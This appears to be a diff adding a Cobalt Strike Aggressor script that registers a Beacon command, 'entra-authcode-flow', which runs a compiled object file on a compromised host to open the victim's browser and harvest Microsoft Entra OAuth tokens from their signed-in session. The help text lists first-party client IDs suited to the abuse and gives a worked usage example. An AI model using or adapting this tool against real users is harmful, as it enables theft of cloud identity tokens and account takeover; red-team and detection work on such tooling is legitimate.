@@ -1,0 +1,74 @@
+beacon_command_register(
+   "entra-authcode-flow",
+   "Obtain Microsoft Entra tokens by initiating an OAuth authorization code flow",
+"
+This BOF initiates an OAuth authorization code flow with Microsoft Entra ID by opening a new browser window.
+
+Conditions:
+
+- The target user must be authenticated to Entra ID in their browser with valid ESTSAUTH* cookies.
+- The specified client id must accept 'https://login.microsoftonline.com/common/oauth2/nativeclient' as a redirect_uri.
+- The specified client id must have consent in the tenancy
+
+For example, the following FOCIs can be used:
+
+Client ID                                Name
+----------------------------------------------------------------------------------
+14638111-3389-403d-b206-a6a71d9f8f16    Copilot App
+cde6adac-58fd-4b78-8d6d-9beaf1b0d668    Global Secure Access Client
+04b07795-8ddb-461a-bbee-02f9e1bf7b46    Microsoft Azure CLI
+1950a258-227b-4e31-a9cf-717495945fc2    Microsoft Azure PowerShell
+2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8    Microsoft Bing Search for Microsoft Edge
+ecd6b820-32c2-49b6-98a6-444530e5a77a    Microsoft Edge
+d7b530a4-7680-4c23-a8bf-c52c121d2e87    Microsoft Edge Enterprise New Tab Page
+82864fa0-ed49-4711-8395-a0e6003dca1f    Microsoft Edge MSAv2
+c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12    Microsoft Power BI
+1fec8e78-bce4-4aaf-ab1b-5451cc387264    Microsoft Teams
+00b41c95-dab0-4487-9791-b9d2c32c80f2    Office 365 Management
+0ec893e0-5785-4de6-99da-4ed124e5296c    Office UWP PWA
+ab9b8c07-8f02-4f72-87fa-80105867a763    OneDrive SyncEngine
+872cd9fa-d31f-45e0-9eab-6e460a02d1f1    Visual Studio - Legacy
+038ddad9-5bbe-4f64-b0cd-12434d1e633b    ZTNA Network Access Client
+d5e23a82-d7e1-4886-af25-27037a0fdc2a    ZTNA Network Access Client -- M365
+760282b4-0cfc-4952-b467-c8e0298fee16    ZTNA Network Access Client -- Private
+
+(see https://github.com/dirkjanm/ROADtools/blob/master/roadtx/roadtools/roadtx/firstpartyscopes.json)
+
+Usage:
+
+    entra-authcode-flow <clientid> <scope> <browser> [opt: email-hint]
+
+    browser:
+        0 = Microsoft Edge
+        1 = Google Chrome
+
+Example:
+
+    entra-authcode-flow 1fec8e78-bce4-4aaf-ab1b-5451cc387264 \"openid offline_access https://graph.microsoft.com/.default\" 0 bob@example.com
+
+");
+
+alias entra-authcode-flow {
+	local('$barch $handle $data $args $targetUsername $targetIP');
+
+	# figure out the arch of this session
+	$barch  = barch($1);
+
+	# read in the right BOF file
+	$handle = openf(script_resource("dist/entra-authcode-flow. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	# pack our arguments
+	$clientid = iff(-istrue $2, $2, "");
+	$scope = iff(-istrue $3, $3, "");
+    $browser = iff(-istrue $4, $4, "");
+    $hint = iff(-istrue $5, $5, "");
+	$args = bof_pack($1, "zziz", $clientid, $scope, $browser, $hint);
+
+	# announce what we're doing
+	btask($1, "Tasked beacon to initiate authorization code flow");
+
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
